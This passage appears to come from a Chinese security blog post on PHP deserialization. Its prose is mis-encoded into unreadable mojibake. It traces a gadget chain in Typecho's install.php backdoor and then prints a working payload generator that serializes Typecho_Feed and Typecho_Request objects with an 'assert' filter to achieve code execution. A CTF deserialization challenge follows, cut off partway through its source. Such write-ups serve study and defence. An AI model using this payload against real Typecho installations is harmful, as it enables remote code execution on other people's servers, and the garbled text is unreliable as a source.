<li>é€šå¸¸ååºåˆ—åŒ–å­—æ®µåœ¨éƒ¨åˆ†å¯æ§æ—¶ä¼šç”¨åˆ°ååºåˆ—åŒ–é€ƒé€¸æŠ€å·§ï¼Œä¸è¿‡åªåœ¨CTFä¸­è§è¿‡ï¼Œé€šè¿‡æŒ‡å®šå­—ç¬¦é•¿åº¦æ¥é€ƒé€¸ï¼Œé˜²æ­¢å‚æ•°è¢«å½“ä½œå­—ç¬¦ä¸²å¤„ç†ï¼Œæ¯”è¾ƒå¸¸è§çš„å°±æ˜¯wafæ›¿æ¢æ¥ç»•è¿‡é•¿åº¦ã€‚è¯¦æƒ…å‚è€ƒ0CTF-2016-piapiapiaã€‚</li>
</ul>
<h4 id="phpååºåˆ—åŒ–çš„ä¾‹å­"><a href="#phpååºåˆ—åŒ–çš„ä¾‹å­" class="headerlink" title="phpååºåˆ—åŒ–çš„ä¾‹å­"></a>phpååºåˆ—åŒ–çš„ä¾‹å­</h4><h5 id="Typechoååºåˆ—åŒ–æ¼æ´å¯¼è‡´å‰å°getshell"><a href="#Typechoååºåˆ—åŒ–æ¼æ´å¯¼è‡´å‰å°getshell" class="headerlink" title="Typechoååºåˆ—åŒ–æ¼æ´å¯¼è‡´å‰å°getshell"></a>Typechoååºåˆ—åŒ–æ¼æ´å¯¼è‡´å‰å°getshell</h5><p>å‰æ®µæ—¶é—´Typechoçš„ä¸€ä¸ªåé—¨ï¼Œåˆ©ç”¨äº†ååºåˆ—åŒ–æ¥éšè—ï¼Œåˆ©ç”¨é“¾é•¿åº¦å±äºä¸­ç­‰å§ï¼Œå¤§å®¶éƒ½å¯ä»¥çœ‹ç€è·Ÿä¸€ä¸‹ï¼Œéå¸¸é€‚åˆå…¥é—¨ã€‚</p>
<p>install.phpæ–‡ä»¶é‡Œé¢æœ‰ä¸ªåé—¨<br>229~235è¡Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;__typecho_config&#x27;</span>))); <span class="comment">//å…³é”®æ§åˆ¶ç‚¹</span></span><br><span class="line"><span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]); <span class="comment">//è¿™é‡Œåé¢ä¹Ÿä¼šç”¨åˆ°</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="variable">$config</span>, <span class="title class_">Typecho_Db</span>::<span class="variable constant_">READ</span> | <span class="title class_">Typecho_Db</span>::<span class="variable constant_">WRITE</span>);</span><br><span class="line"><span class="title class_">Typecho_Db</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$db</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»£ç åˆ†æå‘ç°ä¸Šè¿°ä»£ç çš„è§¦å‘æ¡ä»¶æœ‰ä¸¤ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;typecho&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) || !<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>]) &amp;&amp; <span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>] != <span class="number">80</span> &amp;&amp; !<span class="title class_">Typecho_Common</span>::<span class="title function_ invoke__">isAppEngine</span>()) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;<span class="subst">&#123;$parts[&#x27;host&#x27;]&#125;</span>:<span class="subst">&#123;$parts[&#x27;port&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆ$_GET[â€˜finishâ€™]ä¸ä¸ºç©ºï¼Œå¾ˆå¥½æ»¡è¶³ï¼Œå…¶æ¬¡hostéœ€è¦æ˜¯æœ¬ç«™åœ°å€ä¹Ÿå¾ˆå¥½æ»¡è¶³ï¼Œæ‰€ä»¥å¯å®ç°ã€‚</p>
<p>é‚£ä¹ˆ__typecho_configæ˜¯éœ€è¦æˆ‘ä»¬æ§åˆ¶çš„ååºåˆ—åŒ–ç‚¹ï¼Œé‚£ä¹ˆè¿™ä¸ªæˆ‘ä»¬èƒ½ä¸èƒ½æ§åˆ¶å‘¢ï¼Ÿç›´æ¥çœ‹è·å–__typecho_configçš„getå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="variable">$_prefix</span> . <span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$value</span> = <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$key</span>]) ? <span class="variable">$_COOKIE</span>[<span class="variable">$key</span>] : (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$_POST</span>[<span class="variable">$key</span>] : <span class="variable">$default</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="variable">$default</span> : <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ä»£ç ä¸­å¯ä»¥çœ‹åˆ°$_COOKIEä¸ºç©ºæ—¶æˆ‘ä»¬ç›´æ¥POSTæ•°æ®å³å¯æ§åˆ¶__typecho_configï¼Œç„¶åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å±é™©å‡½æ•°æ¥è¿›è¡Œè§¦å‘ã€‚<br>ç»è¿‡å…¨å±€æœç´¢(å½“ç„¶è¿‡ç¨‹è‚¯å®šå¾ˆéº»çƒ¦ï¼Œå„ç§å±é™©å‡½æ•°å’Œé­”æœ¯æ–¹æ³•éƒ½è¦è¿‡ä¸€é)å‘ç°Feed.phpæ–‡ä»¶çš„__toString() æ–¹æ³•çš„290è¡Œå·¦å³ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dateFormat</span>(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="comment">//ä¸‹é¢çš„ä»£ç ä¸é‡è¦</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬é€šè¿‡åŸºç¡€çŸ¥è¯†ç‚¹å¾—çŸ¥ å½“æŠŠä¸€ä¸ªç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨toStringæ–¹æ³•ï¼Œè€Œä¸Šé¢çš„install.phpæ–‡ä»¶çš„232è¡Œæœ‰ä¸€è¡Œè¿™æ ·çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œï¼Œ è·Ÿè¿›Typecho_Dbï¼Œ æœ‰ä¸€è¡Œä»£ç æ˜¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$adapterName</span> = â€˜Typecho_Db_Adapter_â€™ . <span class="variable">$adapterName</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„$adapterNameå°±å¯¹åº”ç€configé‡Œé¢çš„adapterï¼Œè¿™é‡Œç”¨äº†æ‹¼æ¥æ“ä½œï¼ŒPHPæ˜¯å¼±ç±»å‹çš„è¯­è¨€ï¼ŒæŠŠä¸€ä¸ªå­—ç¬¦ä¸²å’Œä¸€ä¸ªç±»æ‹¼æ¥çš„æ—¶å€™ï¼Œä¼šå¼ºåˆ¶æŠŠç±»è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±ä¼šè§¦å‘ä¼ è¿›æ¥çš„è¿™ä¸ªç±»çš„__toStringæ–¹æ³•ã€‚æ‰€ä»¥adapterè®¾ç½®ä¸ºä¸€ä¸ªç±»ï¼Œé‚£ä¹ˆå°±å¯ä»¥è§¦å‘è¿™ä¸ªç±»çš„toString()æ–¹æ³•ã€‚ç°åœ¨æˆ‘ä»¬è¿”å›ä¸Šé¢Feed.phpçš„__tostring ã€‚<br>å…¶ä¸­è°ƒç”¨äº†$item[â€˜authorâ€™]-&gt;screenNameï¼Œ$itemæ˜¯$this-&gt;itemsçš„foreachå¾ªç¯å‡ºæ¥çš„ï¼Œå¹¶ä¸”$this-&gt;itemsæ˜¯Typecho_Feedç±»çš„ä¸€ä¸ªprivateå±æ€§ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ª$itemæ¥è°ƒç”¨æŸä¸ªç±»çš„get()æ–¹æ³•ï¼Œä¸Šé¢è¯´è¿‡get()æ–¹æ³•æ˜¯ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®ï¼Œå®é™…æ‰§è¡Œä¸­è¿™é‡Œä¼šè·å–è¯¥ç±»çš„screenNameå±æ€§ï¼Œå¦‚æœæˆ‘ä»¬ç»™$item[â€˜authorâ€™]è®¾ç½®çš„ç±»ä¸­æ²¡æœ‰screenNameå°±ä¼šæ‰§è¡Œè¯¥ç±»çš„get()æ–¹æ³•ï¼Œæˆ‘ä»¬ç»§ç»­æ¥å…¨å±€æœç´¢ä¸€ä¸‹get()æ–¹æ³•ã€‚<br>&#x2F;var&#x2F;Typecho&#x2F;Request.phpä¸­æœ‰å¯åˆ©ç”¨çš„__get()æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//getæ–¹æ³•å¦‚ä¸‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸‹é¢æ—¶ä¸Šé¢getæ–¹æ³•ä»£ç è°ƒç”¨çš„getæ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">0</span> ? <span class="variable">$value</span> : <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_applyFilter</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°ä»£ç æœ€åä¸€è¡Œå‘ç° $this-&gt;_applyFilter($value);:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_filter <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>) :</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ° call_user_func å±é™©å‡½æ•°ï¼Œå®ƒåœ¨ä¼ å…¥å‚æ•°$valueä¸æ˜¯æ•°ç»„çš„æ—¶å€™è°ƒç”¨ï¼Œarray_map åœ¨ä¼ å…¥å‚æ•°$valueæ˜¯æ•°ç»„çš„æ—¶å€™è°ƒç”¨ã€‚æ‰€ä»¥åˆ©ç”¨é“¾å°±æ˜ç¡®äº†ï¼šç›´æ¥æ„é€ ä¸€ä¸ªæ•°ç»„ é”®å€¼ä¸º assert phpinfo<br>payloadå¦‚ä¸‹(å‚è€ƒäº†ç½‘ä¸Šçš„payload)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RSS1</span> = <span class="string">&#x27;RSS 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RSS2</span> = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ATOM1</span> = <span class="string">&#x27;ATOM 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATE_RFC822</span> = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATE_W3CDTF</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">EOL</span> = <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_type = <span class="variable language_">$this</span>::<span class="variable constant_">RSS2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;link&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;date&#x27;</span> =&gt; <span class="number">1508895132</span>,</span><br><span class="line">            <span class="string">&#x27;category&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>()),</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>(),</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br></pre></td></tr></table></figure>
<h5 id="phpååºåˆ—åŒ–åœ¨CTFä¸­çš„ç©å„¿æ³•"><a href="#phpååºåˆ—åŒ–åœ¨CTFä¸­çš„ç©å„¿æ³•" class="headerlink" title="phpååºåˆ—åŒ–åœ¨CTFä¸­çš„ç©å„¿æ³•"></a>phpååºåˆ—åŒ–åœ¨CTFä¸­çš„ç©å„¿æ³•</h5><p>PSï¼šå¿˜è®°æ˜¯å“ªä¸ªCTFäº†ï¼Œåæ­£åšäº†ä¸€å¤©æ‰åšå‡ºæ¥ï¼Œå¯èƒ½è¿˜æ˜¯è‡ªå·±å¤ªèœã€‚<br>index.phpä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;  </span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­file æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ï¼Œå¯åˆ©ç”¨æ–‡ä»¶åŒ…å«è¿›è¡Œæ–‡ä»¶è¯»å–ï¼ˆè¿™é‡Œè®²åºåˆ—åŒ–å°±ä¸è®²è¿™éƒ¨åˆ†äº†ï¼‰ï¼Œä½†æ˜¯å› ä¸ºå‚æ•°ä¸èƒ½åŒ…å«flagå…³é”®å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥è¯»å–flagã€‚å¦å¤–æˆ‘ä»¬ä¹ŸçŸ¥é“äº†index.phpä¼šå¯¹æˆ‘ä»¬ä¼ å…¥çš„payloadå‚æ•°è°ƒç”¨parse_urlå‡½æ•°è¿›è¡Œè§£æï¼Œç„¶åå¯¹æˆ‘ä»¬å¾—æ¯ä¸ªå‚æ•°è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼ŒåŒ¹é…åˆ°flagå°±ç›´æ¥é€€å‡ºï¼Œè¿™é‡Œè‚¯å®šéœ€è¦æŠ€å·§ç»•è¿‡çš„ã€‚æˆ‘ä»¬å…ˆçœ‹æç¤ºçš„hint.php<br>hint.phpä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;         </span><br><span class="line">            &#125;          </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Waking upn&quot;</span>;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123;           </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>;       </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">getFlag</span>();   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;         </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));      </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));          </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;token_flag)&#123;     </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;      </span><br><span class="line">                <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file,<span class="literal">true</span>);               </span><br><span class="line">            